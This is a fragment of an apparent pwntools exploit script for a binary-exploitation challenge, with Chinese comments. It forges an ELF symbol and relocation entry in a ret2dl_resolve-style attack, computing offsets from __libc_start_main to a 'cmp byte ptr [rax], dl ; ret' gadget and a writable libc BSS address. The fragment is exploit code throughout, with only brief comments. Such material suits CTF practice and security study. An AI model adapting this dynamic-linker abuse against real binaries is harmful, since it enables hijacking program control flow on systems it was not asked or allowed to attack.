...
fake_st_value=0x8eb46-0x20740
fake_r_offset=0x3c5720-0x20740    #这里是为了使l_addr+r_offset指向可写的地址
val_0x68=0x600ea8
val_0x70=0x600eb8
val_0xf8=0x600f28
wait_time=0.1
...
fake_sym = p32(st_name) + p32(0x112) + p64(fake_st_value) + p64(0)
...
#目标：0x8eb46 : cmp byte ptr [rax], dl ; ret
#>>> hex(elf.symbols['__libc_start_main'])
#'0x20740'
#0x8eb46-0x20740=0x6E406

#lib_bss_addr=0x3c5720
